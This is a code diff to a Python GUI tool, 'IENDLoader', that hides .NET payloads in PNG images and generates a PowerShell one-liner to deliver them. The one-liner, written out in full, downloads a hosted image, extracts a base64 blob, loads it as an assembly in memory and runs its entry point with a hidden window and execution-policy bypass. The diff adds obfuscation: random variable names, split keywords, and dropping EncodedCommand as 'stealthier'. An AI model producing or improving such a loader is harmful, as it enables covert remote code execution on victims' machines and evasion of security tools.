@@ -11,6 +11,8 @@ import threading
 from pathlib import Path
 import socket
 import time
+import random
+import string
 
 # Set appearance
 ctk.set_appearance_mode("dark")
@@ -23,7 +25,8 @@ class IENDLoaderApp(ctk.CTk):
         # Window setup
         self.title("IENDLoader")
         self.geometry("800x650")
-        self.resizable(False, False)
+        self.resizable(True, True)
+        self.minsize(700, 550)  # Minimum size to keep UI usable
         
         # State
         self.payload_path = None
@@ -45,19 +48,19 @@ class IENDLoaderApp(ctk.CTk):
         # Animated title
         self.title_label = ctk.CTkLabel(
             header_frame,
-            text="⚡ IENDLOADER",
+            text="IENDLOADER",
             font=ctk.CTkFont(size=32, weight="bold"),
             text_color=("#00ff00", "#00cc00")
         )
-        self.title_label.pack()
+        self.title_label.pack(pady=(5, 0), anchor="center", expand=True)
         
         self.subtitle_label = ctk.CTkLabel(
-            header_frame,
-            text="Stealthy Payload Delivery System",
-            font=ctk.CTkFont(size=14),
-            text_color=("#888888", "#666666")
-        )
-        self.subtitle_label.pack(pady=(5, 0))
+        header_frame,
+        text="Hide .NET Stubs in PNGs",
+        font=ctk.CTkFont(size=14),
+        text_color=("#888888", "#666666"),
+        justify="center")
+        self.subtitle_label.pack(pady=(5, 0), anchor="center", expand=True)
         
         # Scrollable frame for main content
         scrollable_frame = ctk.CTkScrollableFrame(
@@ -483,27 +486,32 @@ class IENDLoaderApp(ctk.CTk):
         self.url_entry.insert(0, url)
     
     def generate_command(self):
-        """Generate PowerShell one-liner"""
+        """Generate stealthy PowerShell one-liner"""
         url = self.url_entry.get().strip()
         
         if not url:
             messagebox.showwarning("Missing URL", "Please enter the hosted image URL first")
             return
         
-        self.update_status("⚡ Generating PowerShell command...")
+        self.update_status("⚡ Generating stealthy PowerShell command...")
         self.animate_button(self.generate_btn)
         
-        # Create inline PowerShell script based on entry point mode
+        # Generate random variable names for obfuscation
+        def rand_var():
+            return ''.join(random.choices(string.ascii_lowercase, k=2))
+        
+        v1, v2, v3, v4, v5, v6, v7, v8, v9 = [rand_var() for _ in range(9)]
+        
+        # Create obfuscated inline PowerShell script
         if self.auto_entry_point:
-            # Auto-discovery mode
-            inline_script = f'''$wc=New-Object Net.WebClient;$wc.Encoding=[Text.Encoding]::UTF8;$d=$wc.DownloadString('{url}');if($d-match'BaseStart-(.*?)-BaseEnd'){{$b=$matches[1];$p=[Convert]::FromBase64String($b);$a=[Reflection.Assembly]::Load($p);$e=$a.EntryPoint;if(!$e){{$a.GetTypes()|%{{$t=$_;$t.GetMethods([Reflection.BindingFlags]'Static,Public,NonPublic')|?{{$_.Name-eq'Main'}}|%{{$e=$_}}}}}};if($e){{$ps=$e.GetParameters();if($ps.Length-eq0){{$e.Invoke($null,$null)}}else{{$e.Invoke($null,@(,[string[]]@()))}}}}}}'''
+            # Auto-discovery mode with max stealth
+            inline_script = f'''${v1}=New-Object Net.WebClient;${v1}.Encoding=[Text.Encoding]::UTF8;${v2}=${v1}.DownloadString('{url}');if(${v2}-match('Ba'+'se'+'Start'+'-'+'(.*)'+'-'+'Ba'+'se'+'End')){{${v3}=$matches[1];${v4}=[Convert]::('From'+'Base'+'64String').Invoke(${v3});${v5}=[Reflection.Assembly]::('Lo'+'ad').Invoke(${v4});${v6}=${v5}.EntryPoint;if(!${v6}){{${v5}.GetTypes()|%{{${v7}=$_;${v7}.GetMethods([Reflection.BindingFlags]'Static,Public,NonPublic')|?{{$_.Name-eq('Ma'+'in')}}|%{{${v6}=$_}}}}}};if(${v6}){{${v8}=${v6}.GetParameters();if(${v8}.Length-eq0){{${v6}.Invoke($null,$null)}}else{{${v6}.Invoke($null,@(,[string[]]@()))}}}}}}'''
         else:
-            # Manual entry point mode
+            # Manual entry point mode with max stealth
             entry_point = self.entry_point_entry.get().strip()
             if not entry_point:
-                entry_point = "Client.Program.Main"  # Default fallback
+                entry_point = "Client.Program.Main"
             
-            # Parse entry point (e.g., "Client.Program.Main" -> type: "Client.Program", method: "Main")
             parts = entry_point.split('.')
             if len(parts) < 2:
                 messagebox.showwarning("Invalid Entry Point", "Entry point must be in format: Namespace.Class.Method")
@@ -512,14 +520,14 @@ class IENDLoaderApp(ctk.CTk):
             method_name = parts[-1]
             type_name = '.'.join(parts[:-1])
             
-            inline_script = f'''$wc=New-Object Net.WebClient;$wc.Encoding=[Text.Encoding]::UTF8;$d=$wc.DownloadString('{url}');if($d-match'BaseStart-(.*?)-BaseEnd'){{$b=$matches[1];$p=[Convert]::FromBase64String($b);$a=[Reflection.Assembly]::Load($p);$t=$a.GetType('{type_name}');if($t){{$e=$t.GetMethod('{method_name}',[Reflection.BindingFlags]'Static,Public,NonPublic');if($e){{$ps=$e.GetParameters();if($ps.Length-eq0){{$e.Invoke($null,$null)}}else{{$e.Invoke($null,@(,[string[]]@()))}}}}}}}}'''
+            inline_script = f'''${v1}=New-Object Net.WebClient;${v1}.Encoding=[Text.Encoding]::UTF8;${v2}=${v1}.DownloadString('{url}');if(${v2}-match('Ba'+'se'+'Start'+'-'+'(.*)'+'-'+'Ba'+'se'+'End')){{${v3}=$matches[1];${v4}=[Convert]::('From'+'Base'+'64String').Invoke(${v3});${v5}=[Reflection.Assembly]::('Lo'+'ad').Invoke(${v4});${v6}=${v5}.GetType('{type_name}');if(${v6}){{${v7}=${v6}.GetMethod('{method_name}',[Reflection.BindingFlags]'Static,Public,NonPublic');if(${v7}){{${v8}=${v7}.GetParameters();if(${v8}.Length-eq0){{${v7}.Invoke($null,$null)}}else{{${v7}.Invoke($null,@(,[string[]]@()))}}}}}}}}'''
         
-        # Base64 encode
-        script_bytes = inline_script.encode('utf-16le')
-        encoded_script = base64.b64encode(script_bytes).decode('ascii')
+        # Use direct execution instead of EncodedCommand (stealthier)
+        # Escape quotes for command line
+        escaped_script = inline_script.replace('"', '`"')
         
-        # Generate final command
-        command = f'''C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded_script}'''
+        # Generate final command - no -EncodedCommand flag
+        command = f'''powershell.exe -NoP -NonI -W 1 -Exec Bypass -Command "{escaped_script}"'''
         
         self.cmd_textbox.configure(state="normal")
         self.cmd_textbox.delete("1.0", "end")
